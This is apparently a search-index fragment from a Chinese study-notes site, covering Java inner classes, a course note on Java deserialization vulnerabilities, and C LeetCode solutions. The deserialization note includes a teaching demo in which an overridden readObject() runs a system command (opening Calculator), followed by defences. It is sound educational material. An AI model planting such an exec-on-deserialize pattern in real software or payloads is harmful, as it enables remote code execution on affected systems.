System.out.println(num);\n//\u5982\u679c\u5728\u5c40\u90e8\u5185\u90e8\u7c7b\u8c03\u7528\u5916\u90e8\u5c40\u90e8\u53d8\u91cf\uff0c\u5219\u8be5\u53d8\u91cf\u5f3a\u5236\u8f6c\u5316\u4e3afinal\u7c7b\u578b(\u4fdd\u8bc1\u751f\u547d\u5468\u671f\u4e00\u81f4)\n            }\n        //num++; \u5bf9num\u7684\u64cd\u4f5c\u4e0d\u80fd\u548c\u5c40\u90e8\u5185\u90e8\u7c7b\u8c03\u7528num\u540c\u65f6\u5b58\u5728\n        new In().inMethod();\n        }\n    }\n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_31","title":"\u533f\u540d\u5185\u90e8\u7c7b","text":"<ul> <li>\u6ca1\u6709\u7c7b\u540d\u7684\u5c40\u90e8\u5185\u90e8\u7c7b (\u4e00\u5207\u7279\u5f81\u90fd\u4e0e\u5c40\u90e8\u5185\u90e8\u7c7b\u76f8\u540c)</li> <li>\u5fc5\u987b\u7ee7\u627f\u4e00\u4e2a\u7236\u7c7b\u6216\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3</li> <li>\u5b9a\u4e49\u7c7b\u3001\u5b9e\u73b0\u7c7b\u3001\u521b\u5efa\u5bf9\u8c61\u7684\u8bed\u6cd5\u5408\u5e76\uff0c\u53ea\u80fd\u521b\u5efa\u4e00\u4e2a\u8be5\u7c7b\u7684\u5bf9\u8c61</li> <li>\u4f18\u70b9<ul> <li>\u51cf\u5c11\u4ee3\u7801\u91cf</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u53ef\u8bfb\u6027\u8f83\u5dee</li> </ul> </li> </ul>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Java \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":""},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#java","title":"Java \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p> \u7ea6 1410 \u4e2a\u5b57  94 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>\u5e94\u8bfe\u7a0b\u4f5c\u4e1a\u8981\u6c42\uff0c\u5199\u4e00\u7bc7\u5173\u4e8e\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u7b14\u8bb0</p>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#_1","title":"\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316","text":"<p>\u542b\u4e49</p> <p>\u5e8f\u5217\u5316\u5c31\u662f\u628a\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217(\u5373\u53ef\u4ee5\u5b58\u50a8\u6216\u4f20\u8f93\u7684\u5f62\u5f0f)\u7684\u8fc7\u7a0b\uff0c\u800c\u53cd\u5e8f\u5217\u5316\u5219\u662f\u4ed6\u7684\u9006\u64cd\u4f5c\uff0c\u5373\u628a\u4e00\u4e2a\u5b57\u8282\u5e8f\u5217\u8fd8\u539f\u4e3a\u5bf9\u8c61\u7684\u8fc7\u7a0b\u3002</p> <p>\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u4e00\u822c\u7528\u4e8e\u5bf9\u8c61\u7684\u4fdd\u5b58\u548c\u7f51\u7edc\u4f20\u8f93\u5bf9\u8c61\u7684\u5b57\u8282\u5e8f\u5217\u7b49\u573a\u666f\u3002</p> <p></p> <p>Java\u4e2d\uff0c\u5b9e\u73b0\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u5206\u522b\u4f4d\u4e8e <code>java.io.ObjectOutputStream</code> \u548c <code>java.io.ObjectInputStream</code> \u4e2d</p> <ul> <li>\u5e8f\u5217\u5316 ObjectOutputStream\u7c7b =&gt; writeObject()<ul> <li>\u8be5\u65b9\u6cd5\u5bf9\u53c2\u6570\u6307\u5b9a\u7684obj\u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u628a\u5b57\u8282\u5e8f\u5217\u5199\u5230\u4e00\u4e2a\u76ee\u6807\u8f93\u51fa\u6d41\u4e2d\uff0c\u6309Java\u7684\u6807\u51c6\u7ea6\u5b9a\u662f\u7ed9\u6587\u4ef6\u4e00\u4e2a.ser\u6269\u5c55\u540d</li> <li>\u6d41\u7a0b\uff1a<ul> <li>(1) \u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u8f93\u51fa\u6d41(\u4e5f\u53ef\u4ee5\u662f\u6587\u4ef6\u8f93\u51fa\u6d41)</li> <li>(2) \u901a\u8fc7\u5bf9\u8c61\u8f93\u51fa\u6d41\u7684writeObject\u65b9\u6cd5\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u5199\u5165\u8f93\u51fa\u6d41</li> </ul> </li> </ul> </li> <li>\u53cd\u5e8f\u5217\u5316 ObjectInputStream\u7c7b --&gt; readObject()<ul> <li>\u8be5\u65b9\u6cd5\u4ece\u4e00\u4e2a\u6e90\u8f93\u5165\u6d41\u4e2d\u8bfb\u53d6\u5b57\u8282\u5e8f\u5217\uff0c\u518d\u628a\u5b83\u4eec\u53cd\u5e8f\u5217\u5316\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5e76\u5c06\u5176\u8fd4\u56de\u3002</li> <li>\u6d41\u7a0b\uff1a<ul> <li>(1) \u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u8f93\u51fa\u6d41(\u4e5f\u53ef\u4ee5\u662f\u6587\u4ef6\u8f93\u51fa\u6d41)</li> <li>(2) \u901a\u8fc7\u5bf9\u8c61\u8f93\u51fa\u6d41\u7684readObject\u65b9\u6cd5\u5c06\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u5199\u5165\u8f93\u51fa\u6d41</li> </ul> </li> </ul> </li> </ul> <pre><code>import java.io.*;\n\npublic class ReflectionPlay implements Serializable {\n//\u5b9e\u73b0Serializable\u63a5\u53e3(\u6216Externaluzable)\u7684\u7c7b\u7684\u5bf9\u8c61\u624d\u80fd\u88ab\u5e8f\u5217\u5316\n    private void exec() throws Exception {\n        String s = \"hello\";\n        byte[] ObjectBytes=serialize(s);\n        String after = (String) deserialize(ObjectBytes);\n        System.out.println(after);\n    }\n\n    /*\n     * \u5e8f\u5217\u5316\u5bf9\u8c61\u5230byte\u6570\u7ec4\n     */\n    private byte[] serialize(final Object obj) throws IOException {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        ObjectOutputStream objOut = new ObjectOutputStream(out);\n        objOut.writeObject(obj);\n        return out.toByteArray();\n    }\n\n    /*\n     * \u4ecebyte\u6570\u7ec4\u4e2d\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\n     */\n    private Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {\n        ByteArrayInputStream in = new ByteArrayInputStream(serialized);\n        ObjectInputStream objIn = new ObjectInputStream(in);\n        return objIn.readObject();\n    }\n    public static void main(String[] args) throws Exception {\n        new ReflectionPlay().exec();\n    }\n}\n</code></pre> <p>\u8be5\u4ee3\u7801\u4f7f\u7528\u4e24\u4e2a\u65b9\u6cd5\u5206\u522b\u5b9e\u73b0 serialize(\u5e8f\u5217\u5316) \u548c deserialize(\u53cd\u5e8f\u5217\u5316) </p> <p>\u4ece\u8fd0\u884c\u7ed3\u679c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u5c06String\u7c7b\u578b\u7684\u5bf9\u8c61\u5e8f\u5217\u5316\u540e\u53c8\u8fdb\u884c\u4e86\u53cd\u5e8f\u5217\u5316\uff0c\u5f97\u5230\u7684\u8fd8\u662f\u539f\u6765\u7684\u5bf9\u8c61\uff0c\u6210\u529f\u5c06 <code>hello</code> \u8f93\u51fa</p>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#php","title":"PHP \u53cd\u5e8f\u5217\u5316","text":"<p>\u5728\u4e86\u89e3 Java \u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u524d\uff0c\u53ef\u4ee5\u5148\u5bf9 PHP \u53cd\u5e8f\u5217\u5316\u6709\u4e00\u4e2a\u5927\u81f4\u8ba4\u8bc6</p> <p>php \u5c06\u6570\u636e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4f1a\u7528\u5230\u4e24\u4e2a\u51fd\u6570</p> <ul> <li>serialize\u00a0\u5c06\u5bf9\u8c61\u683c\u5f0f\u5316\u6210\u6709\u5e8f\u7684\u5b57\u7b26\u4e32</li> <li>unserialize\u00a0\u5c06\u5b57\u7b26\u4e32\u8fd8\u539f\u6210\u539f\u6765\u7684\u5bf9\u8c61</li> </ul> <p>\u5728PHP\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\n$user=array('xiao','shi','zi');\n$user=serialize($user);\necho($user.PHP_EOL);\nprint_r(unserialize($user));\n?&gt;\n/* Output\na:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";}\nArray\n(\n    [0] =&gt; xiao\n    [1] =&gt; shi\n    [2] =&gt; zi\n)\n*\n*\u4e0a\u9762\u8f93\u51fa\u4e2d\uff0ci\u4ee3\u8868\u6574\u578b\u6570\u636e int \uff0cs\u4ee3\u8868\u5b57\u7b26\u4e32\uff0c\u540e\u63a5\u957f\u5ea6\n*/\n</code></pre> <pre><code>&lt;?php\n\nclass FileHandler {\n    public  $op = 2;\n    public  $filename = \"flag.php\";\n}\n\n$a = new FileHandler();\n$b = serialize($a);\necho $b;\n\n?&gt;\n# Output: O:11:\"FileHandler\":2:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";}\n</code></pre>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#_2","title":"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":""},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5982\u679c\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u6267\u884c\u7684\u662f\u6211\u4eec\u7279\u6b8a\u6784\u9020\u7684\u5b57\u8282\u5e8f\u5217\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5c31\u53d1\u751f\u4e86</p> <p>\u5982\u679cJava\u5e94\u7528\u5bf9\u7528\u6237\u8f93\u5165\uff0c\u5373\u4e0d\u53ef\u4fe1\u6570\u636e\u505a\u4e86\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u8f93\u5165\uff0c\u8ba9\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u975e\u9884\u671f\u7684\u5bf9\u8c61\uff0c\u975e\u9884\u671f\u7684\u5bf9\u8c61\u5728\u4ea7\u751f\u8fc7\u7a0b\u4e2d\u5c31\u6709\u53ef\u80fd\u5e26\u6765\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p> <p>Java \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u4e3a \u89e6\u53d1\u70b9 \u548c \u5229\u7528\u94fe \uff0c\u5728\u4e0e\u5ba2\u6237\u4ea4\u4e92\u7684\u9875\u9762\u4e2d\uff0c\u67d0\u4e9b\u65b9\u6cd5\u8f93\u5165\u7684\u53c2\u6570\u4e0d\u53ef\u63a7\uff08\u89e6\u53d1\u70b9\uff09\uff0c\u80fd\u591f\u7ed9\u653b\u51fb\u8005\u6784\u9020\u4efb\u610f\u53c2\u6570\u7684\u673a\u4f1a\u3002\u5c06\u653b\u51fb\u8005\u6784\u9020\u7684\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u53bb\u6267\u884c\uff08\u5229\u7528\u94fe\uff09\uff0c\u4e00\u822c\u4f1a\u8bfb\u53d6\u8f93\u5165\u7684\u53c2\u6570\u3001\u8ba1\u7b97\u8f93\u5165\u7684\u53c2\u6570\uff0c\u4ece\u800c\u6267\u884c\u4e86\u653b\u51fb\u8005\u6784\u9020\u7684\u6076\u610f\u53c2\u6570\u3002</p> <p>Java\u4e2d\u95f4\u4ef6\u901a\u5e38\u901a\u8fc7\u7f51\u7edc\u63a5\u6536\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u800c\u5728\u670d\u52a1\u7aef\u5bf9\u5e8f\u5217\u5316\u6570\u636e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528 readObject( ) \u7b49\u65b9\u6cd5\u3002\u5982\u679c\u67d0\u4e2a\u5bf9\u8c61\u91cd\u5199\u4e86readObject( ) \u7b49\u65b9\u6cd5\uff08\u5728Java\u4e2d\u5982\u679c\u91cd\u5199\u4e86\u67d0\u4e2a\u7c7b\u7684\u65b9\u6cd5\uff0c\u5c31\u4f1a\u4f18\u5148\u8c03\u7528\u7ecf\u8fc7\u4fee\u6539\u540e\u7684\u65b9\u6cd5\uff09\uff0c\u4e14\u5728\u65b9\u6cd5\u4e2d\u80fd\u591f\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u90a3\u670d\u52a1\u7aef\u5728\u8fdb\u884c\u53cd\u5e8f\u5217\u65f6\uff0c\u4e5f\u4f1a\u6267\u884c\u76f8\u5e94\u4ee3\u7801\u3002</p> <p>\u5982\u679c\u80fd\u591f\u627e\u5230\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\u7684\u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316\u5e76\u53d1\u9001\u7ed9Java\u4e2d\u95f4\u4ef6\uff0cJava\u4e2d\u95f4\u4ef6\u4e5f\u4f1a\u53bb\u6267\u884c\u6307\u5b9a\u7684\u4ee3\u7801\uff0c\u5373\u5b58\u5728 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <p>\u53cd\u5c04</p> <p>\u901a\u8fc7\u8c03\u7528 obj.getClass() \u7b49\u51fd\u6570\uff0c\u80fd\u591f\u83b7\u53d6\u4e00\u4e2a\u5bf9\u8c61\u6240\u5c5e\u7684\u7c7b\uff0c\u8fdb\u800c\u80fd\u591f\u6267\u884c\u8be5\u7c7b\u4e2d\u7684\u65b9\u6cd5\uff08\u5305\u62ec\u79c1\u6709\u65b9\u6cd5\uff09</p> <p>\u800cApache Commons Collections\u4e2d\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u63a5\u53e3\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u5b9e\u73b0\u8be5\u63a5\u53e3\u7684\u7c7b\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Java\u7684\u53cd\u5c04\u673a\u5236\u6765 \u8c03\u7528\u4efb\u610f\u51fd\u6570 \uff0c\u53eb\u505aInvokerTransformer\u3002</p> <p>Apache\u662f\u4e00\u4e2a\u8457\u540d\u5f00\u6e90\u9879\u76ee\uff0c\u800cCommons Collections\u4f5c\u4e3a\u5176\u91cd\u8981\u7ec4\u4ef6\uff0c\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5404\u79cdJava\u5e94\u7528\u7684\u5f00\u53d1\u3002Commons Collections\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7c7b\u5305\u6765\u62d3\u5c55\u548c\u589e\u52a0\u6807\u51c6\u7684Java\u7684collection\u6846\u67b6\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u5176\u5f00\u53d1\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u4f1a\u9047\u5230\u5927\u91cf\u7684\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u7684\u5b9e\u73b0\u548c\u8c03\u7528\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u7684\u666e\u904d\u6027\u548c\u4e25\u91cd\u6027</p> <p>Java\u4e2d\u7684Collection</p> <p>Java\u4e2d\u7684collection\u53ef\u4ee5\u7406\u89e3\u4e3aset\uff0clist\uff0cqueue\u7684\u62bd\u8c61\uff0ccollection\u91cc\u9762\u7684\u5bf9\u8c61\u79f0\u4e3acollection\u7684\u5bf9\u8c61\u3002</p>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u5982\u679c\u4e00\u4e2a\u7c7b\u7684\u65b9\u6cd5\u88ab\u91cd\u5199\uff0c\u90a3\u4e48\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\uff0c\u4f1a\u4f18\u5148\u8c03\u7528\u7ecf\u8fc7\u4fee\u6539\u7684\u65b9\u6cd5\u3002\u56e0\u6b64\uff0c \u5982\u679c\u67d0\u4e2a\u53ef\u5e8f\u5217\u5316\u7684\u7c7b\u91cd\u5199\u4e86readObject()\u65b9\u6cd5\uff0c\u5e76\u4e14\u5728readObject()\u4e2d\u5bf9Map\u7c7b\u578b\u7684\u53d8\u91cf\u8fdb\u884c\u4e86\u952e\u503c\u4fee\u6539\u64cd\u4f5c\uff0c\u4e14\u8fd9\u4e2aMap\u53d8\u91cf\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0\u653b\u51fb\u76ee\u6807\u3002</p> <pre><code>public class test{\n    public static void main(String args[]) throws Exception{\n        //\u5b9a\u4e49myObj\u5bf9\u8c61\n        MyObject myObj = new MyObject();\n        myObj.name = \"hi\";\n        //\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u5bf9\u8c61\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u4fe1\u606f\u7684\u201dobject\u201d\u6570\u636e\u6587\u4ef6\n        FileOutputStream fos = new FileOutputStream(\"object\");\n        ObjectOutputStream os = new ObjectOutputStream(fos);\n        //writeObject()\u65b9\u6cd5\u5c06myObj\u5bf9\u8c61\u5199\u5165object\u6587\u4ef6\n        os.writeObject(myObj);\n        os.close();\n        //\u4ece\u6587\u4ef6\u4e2d\u53cd\u5e8f\u5217\u5316obj\u5bf9\u8c61\n        FileInputStream fis = new FileInputStream(\"object\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        //\u6062\u590d\u5bf9\u8c61\n        MyObject objectFromDisk = (MyObject)ois.readObject();\n        System.out.println(objectFromDisk.name);\n        ois.close();\n    }\n}\n\nclass MyObject implements Serializable{\n    public String name;\n    //\u91cd\u5199readObject()\u65b9\u6cd5\n    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{\n        //\u6267\u884c\u9ed8\u8ba4\u7684readObject()\u65b9\u6cd5\n        in.defaultReadObject();\n        //\u6267\u884c\u6253\u5f00\u8ba1\u7b97\u5668\u7a0b\u5e8f\u547d\u4ee4\n        Runtime.getRuntime().exec(\"open /Applications/Calculator.app/\");\n    }\n}\n</code></pre> <p>\u6211\u4eec\u6ce8\u610f\u5230MyObject\u7c7b\u91cd\u5199\u4e86readObject\u65b9\u6cd5\uff0c\u5728\u539f\u672c\u529f\u80fd\u5916\u989d\u5916\u589e\u52a0\u4e86 <code>Runtime.getRuntime().exec(\"open /Applications/Calculator.app/\");</code> \u5077\u5077\u628a\u8ba1\u7b97\u5668\u6253\u5f00\u4e86</p> <p>Danger</p> <p>\u5f53\u7136\uff0c\u8fd9\u53ea\u662fJava\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\uff0c\u5b9e\u9645\u4e0a\u57fa\u4e8e\u6b64\u53ef\u4ee5\u5f15\u7533\u4e3a\u66f4\u590d\u6742\u7684\u5e94\u7528\uff0c\u5728\u6b64\u4e0d\u8fc7\u591a\u4ecb\u7ecd (\u61d2\uff0c\u4e14\u6682\u65f6\u6ca1\u6709\u7528\u5904)</p>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#_5","title":"\u6f0f\u6d1e\u9632\u8303","text":"<ul> <li>(1) \u7c7b\u767d\u540d\u5355\u6821\u9a8c<ul> <li>\u5728 ObjectInputStream \u4e2d resolveClass \u91cc\u53ea\u662f\u8fdb\u884c\u4e86 class \u662f\u5426\u80fd\u88ab load \uff0c\u81ea\u5b9a\u4e49 ObjectInputStream , \u91cd\u8f7d resolveClass \u7684\u65b9\u6cd5\uff0c\u5bf9 className \u8fdb\u884c\u767d\u540d\u5355\u6821\u9a8c</li> </ul> </li> <li>(2) \u7981\u6b62 JVM \u6267\u884c\u5916\u90e8\u547d\u4ee4 Runtime.exec<ul> <li>\u901a\u8fc7\u6269\u5c55 SecurityManager \u5b9e\u73b0</li> </ul> </li> </ul>"},{"location":"Accumulation/Java%E5%BA%8F%E5%88%97%E5%8C%96/#_6","title":"\u53c2\u8003","text":"<ul> <li>https://blog.csdn.net/qq_37019068/article/details/120717474</li> <li>https://paper.seebug.org/312/</li> </ul>"},{"location":"Accumulation/Leetcode%E5%88%B7%E9%A2%98/","title":"LeetCode","text":""},{"location":"Accumulation/Leetcode%E5%88%B7%E9%A2%98/#leetcode","title":"Leetcode \u9898\u76ee\u8bb0\u5f55","text":"<p> \u7ea6 921 \u4e2a\u5b57  184 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>\u6253\u7b97\u5076\u5c14\u53bb Leetcode \u7ec3\u4e00\u7ec3\u7b97\u6cd5\u601d\u60f3\uff0c\u6240\u4ee5\u5728\u6b64\u8bb0\u5f55\u4e00\u4e9b\u9898\u76ee\u7684\u6ce8\u610f\u70b9\u6216\u662f\u601d\u8def</p>"},{"location":"Accumulation/Leetcode%E5%88%B7%E9%A2%98/#1","title":"1.\u4e24\u6570\u4e4b\u548c","text":"<p>\u4f5c\u4e3a\u529b\u6263\u7684\u7b2c\u4e00\u9898\u96be\u5ea6\u8fd8\u662f\u5f88\u7b80\u5355\u7684\uff0c\u4f46\u662f\u7528C\u8bed\u8a00\u5199\u7684\u65f6\u5019\u7ed9\u51fa\u7684\u63a5\u53e3\u4e3a <code>int* twoSum(int* nums, int numsSize, int target, int* returnSize)</code> </p> <p>\u4e00\u5f00\u59cb\u6ca1\u641e\u61c2 returnSize \u7684\u542b\u4e49\uff0c\u5b83\u5176\u5b9e\u662f\u4f60\u6700\u7ec8\u7ed3\u679c\u7684\u957f\u5ea6\uff0c\u4e5f\u5c31\u662f 2 \u6216 0</p> <p>\u5982\u679c\u53ea\u662f\u5e0c\u671b \\(O(N^2)\\) \u89e3\u51b3\u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u5b58\u653e\u7ed3\u679c\u7684\u6570\u7ec4\u9700\u8981\u7528\u52a8\u6001\u5206\u914d\u7684\u65b9\u5f0f\u521d\u59cb\u5316\uff0c\u4e0d\u7136\u4f1a\u7206\uff1b\u53e6\u5916\u8bb0\u5f97\u6ca1\u6709\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c\u65f6\u4e5f\u8981\u6709\u8fd4\u56de\u503c</p> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>int* twoSum(int* nums, int numsSize, int target, int* returnSize) {\n    int *result=(int*)malloc(sizeof(int) * 2);\n    for(int i = 0;i&lt;numsSize;i++){\n        for(int j = i+1;j&lt;numsSize;j++){\n            if(nums[i] + nums[j] == target){\n                result[0] = i;\n                result[1] = j;\n                *returnSize = 2;\n                return result;\n            }\n        }\n    }*returnSize = 0;\n    return NULL;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u6765\u6548\u7387\u975e\u5e38\u4e00\u822c\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u4e86\u89e3\u4e00\u4e0b\u66f4\u9ad8\u6548\u7684\u89e3\u6cd5 \uff08\u5176\u5b9e\u5c31\u662f\u54c8\u5e0c\u8868\uff09</p>"},{"location":"Accumulation/Leetcode%E5%88%B7%E9%A2%98/#2","title":"2.\u4e24\u6570\u76f8\u52a0","text":"<p>\u4e5f\u662f\u5f88\u7b80\u5355\u7684\u9898\u76ee\uff0c\u6309\u7167\u5168\u52a0\u5668\u7684\u601d\u60f3\u5199\u4e2a while \u5faa\u73af\u5373\u53ef\u89e3\u51b3\uff0c\u968f\u624b\u5199\u4e86\u4efd\u6ca1\u4f18\u5316\u7684\u5c31\u901a\u8fc7\u4e86\uff0c\u8fd8\u51fb\u8d25\u4e86 43% ...</p> <p>\u53c2\u8003\u4ee3\u7801\uff1a</p> <pre><code>/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     struct ListNode *next;\n * };\n */\nstruct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2) {\n    struct ListNode* result = (struct ListNode*)malloc(sizeof(struct ListNode));\n    struct ListNode* start = result;\n    struct ListNode* pre = result;\n    int carry=0;\n    int sum=0;\n    while(l1!=NULL &amp;&amp; l2!=NULL){\n        sum = l1-&gt;val + l2-&gt;val + carry;\n        carry = sum / 10;\n        sum -= carry*10;\n        result-&gt;val = sum;\n        l1 = l1-&gt;next;\n        l2 = l2-&gt;next;\n        pre = result;\n        result-&gt;next = (struct ListNode*)malloc(sizeof(struct ListNode));\n        result = result-&gt;next;\n    }\n    while(l1!=NULL){\n        sum = l1-&gt;val + carry;\n        carry = sum / 10;\n        sum -= carry*10;\n        result-&gt;val = sum;\n        l1 = l1-&gt;next;\n        pre = result;\n        result-&gt;next = (struct ListNode*)malloc(sizeof(struct ListNode));\n        result = result-&gt;next;\n    }\n    while(l2!=NULL){\n        sum =l2-&gt;val + carry;\n        carry = sum / 10;\n        sum -= carry*10;\n        result-&gt;val = sum;\n        l2 = l2-&gt;next;\n        pre = result;\n        result-&gt;next = (struct ListNode*)malloc(sizeof(struct ListNode));\n        result = result-&gt;next;\n    }if(carry != 0){\n        result-&gt;val = 1;\n        result-&gt;next = NULL;\n    }else{\n        pre-&gt;next = NULL;\n    }return start;\n}\n</code></pre> <p>\u597d\u5b69\u5b50\u4e0d\u8981\u5199\u5c4e\u5c71\u54e6</p> <p>\u770b\u4e86\u4e0b\u5b98\u65b9\u9898\u89e3\uff0c\u4fee\u6539\u6210\u4ee5\u4e0b\u4e3b\u4f53\u7ed3\u6784\u770b\u8d77\u6765\u786e\u5b9e\u4f18\u7f8e\u5f88\u591a\uff1a</p> <pre><code>    while (l1 || l2) {\n        int n1 = l1 ? l1-&gt;val : 0;\n        int n2 = l2 ? l2-&gt;val : 0;\n        int sum = n1 + n2 + carry;\n\n        /*Main Code Omitted*/\n\n        carry = sum / 10;\n        if (l1)\n            l1 = l1-&gt;next;\n        if (l2)\n            l2 = l2-&gt;next;\n    }\n    if (carry &gt; 0) {\n        tail-&gt;next = malloc(sizeof(struct ListNode));\n        tail-&gt;next-&gt;val = carry;\n        tail-&gt;next-&gt;next = NULL;\n    }\n    // \u6ce8\u610f\u6700\u540e\u7684\u8fdb\u4f4d\u4e0d\u8981\u5fd8\u8bb0\n</code></pre>"},{"location":"Accumulation/Leetcode%E5%88%B7%E9%A2%98/#3","title":"3.\u65e0\u91cd\u590d\u7684\u6700\u957f\u5b50\u4e32","text":"<p>\u7531\u4e8e ASCII \u603b\u5171\u5c31 128 \u4e2a\uff0c\u6240\u4ee5\u76f4\u63a5\u91c7\u7528\u5bb9\u91cf\u4e3a 128 \u7684\u8868\u6765\u5b58\u50a8\u5bf9\u5e94\u5b57\u7b26\u662f\u5426\u5df2\u7ecf\u51fa\u73b0\u8fc7\u4e86</p> <p>\u8868\u4e2d\u7684\u6570\u503c\u662f\u5f53\u524d\u5b57\u7b26\u4e0a\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\u7684 index +1 \uff0c+1 \u662f\u4e3a\u4e86\u514d\u53bb <code>!store[(int)s[i]]</code> \u7684\u68c0\u6d4b</p> <p>\u6bcf\u6b21\u68c0\u6d4b\u5230\u91cd\u590d\uff0c\u5c31\u628a\u8868\u6e05\u7a7a\uff0c\u5e76\u4ece\u4e0a\u4e00\u4e2a\u91cd\u590d\u5143\u7d20\u5904\u91cd\u65b0\u68c0\u6d4b\u5b50\u4e32</p> <p>\u8fd9\u6837\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u6709 \\(O(N^2)\\) \u4e86\uff0c\u54c8\u54c8</p> <pre><code>int lengthOfLongestSubstring(char* s) {\n    int store[128];\n    int length = 0, maxlength = 0;\n    memset(store,0,sizeof(store));\n    for(int i=0;i&lt;strlen(s);++i){\n        if(!store[(int)s[i]]){\n            store[(int)s[i]] = i+1; \n            // index \u4e3a 0 \u88ab\u5237\u6389\u4e86\uff0c\u56e0\u6b64\u8fd9\u91cc\u5b58\u7684\u6570\u503c\u8981\u5927\u4e8e\u7b49\u4e8e 1\n            ++length;\n        }else{\n            i = store[(int)s[i]]-1;\n            memset(store,0,sizeof(store));\n            maxlength = (maxlength &gt; length)?maxlength:length;\n            length = 0;\n        }\n    }return (maxlength &gt; length)?maxlength:length;\n    // \u6709\u53ef\u80fd\u6574\u4e2a\u5b57\u7b26\u4e32\u90fd\u6ca1\u6709\u91cd\u590d\u5143\u7d20\n}\n</code></pre> 